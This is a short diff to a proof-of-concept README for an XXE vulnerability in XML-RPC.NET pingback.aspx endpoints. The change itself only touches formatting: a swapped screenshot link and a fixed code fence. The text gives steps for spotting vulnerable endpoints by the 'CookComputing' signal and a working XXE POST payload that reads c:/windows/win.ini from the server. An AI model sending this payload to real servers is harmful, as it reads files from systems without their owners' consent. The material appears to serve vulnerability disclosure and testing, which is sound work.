@@ -3,15 +3,15 @@ Proof of Concept (PoC) for XML-RPC.NET XXE
 
 1. Identify a vulnerable pingback.aspx endpoint. "CookComputing" tends to be a strong signal.
 
-![xmlrpc-xxe-1](https://user-images.githubusercontent.com/3679232/207164709-a158b1c6-3b73-480f-b01b-c33bc1daf2d9.png)
+![xml-rpc-1](https://user-images.githubusercontent.com/3679232/207168120-9465cd3d-2f3d-4ae0-b308-090de2b2501f.png)
 
 2. Leverage the following XXE POST payload:
 
-'''
+```
 <?xml version="1.0" encoding="ISO-8859-1"?> 
 <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM  
 "file://c:/windows/win.ini">]><foo>&xxe;</foo> 
-'''
+```
 
 3. Request a non-existent file on the remote server (e.g. "winFAKE.ini")
 
